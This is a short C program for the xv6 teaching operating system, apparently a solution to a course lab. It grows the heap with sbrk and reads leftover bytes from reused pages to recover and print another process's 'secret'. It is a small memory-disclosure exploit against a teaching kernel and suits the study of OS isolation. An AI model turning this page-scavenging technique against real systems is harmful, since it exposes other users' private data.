#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{

  printf("attack start\n");
  char *end = sbrk(PGSIZE * 32);
  
  printf("end: %p\n", end);
  end = end + 16 * PGSIZE;
  printf("end + 16 * PGSIZE: %p\n", end);
  char *secret = end + 32;
  printf("secret: %s\n", secret);
  write(2, secret, 8);
  exit(1);
}
